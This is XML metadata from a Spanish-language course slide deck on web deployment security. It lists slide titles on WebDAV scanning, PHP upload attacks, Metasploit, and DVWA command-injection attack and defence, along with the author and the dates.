      <vt:lpstr>Inyección HTML</vt:lpstr>
      <vt:lpstr>Consulta DAV en shodan</vt:lpstr>
      <vt:lpstr>davtest</vt:lpstr>
      <vt:lpstr>davtest</vt:lpstr>
      <vt:lpstr>Conulta DAV con - nikto</vt:lpstr>
      <vt:lpstr>Configurar DAV en apache</vt:lpstr>
      <vt:lpstr>Configurar DAV en apache</vt:lpstr>
      <vt:lpstr>Configurar DAV en apache</vt:lpstr>
      <vt:lpstr>Configurar DAV en apache</vt:lpstr>
      <vt:lpstr>Crear PHP para inyectar</vt:lpstr>
      <vt:lpstr>Inyectar el código PHP malicioso</vt:lpstr>
      <vt:lpstr>Inyectar el código PHP malicioso</vt:lpstr>
      <vt:lpstr>Inyectar el código PHP malicioso</vt:lpstr>
      <vt:lpstr>Ataque con metasploid</vt:lpstr>
      <vt:lpstr>Ataque con metasploid</vt:lpstr>
      <vt:lpstr>Ataque con metasploid</vt:lpstr>
      <vt:lpstr>Otras formas de subir el fichero PHP</vt:lpstr>
      <vt:lpstr>Práctica</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>DVWA: inyección comando ataque</vt:lpstr>
      <vt:lpstr>DVWA: inyección comando defensa</vt:lpstr>
      <vt:lpstr>Práctica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ASIX - M09 - Implantació Web</dc:title>
  <dc:creator>Josep Maria Herrera Marimon</dc:creator>
  <cp:lastModifiedBy>Josep Maria Herrera Marimon</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-07-28T16:44:08Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-03-20T14:24:08Z</dcterms:modified>
</cp:coreProperties>
</file>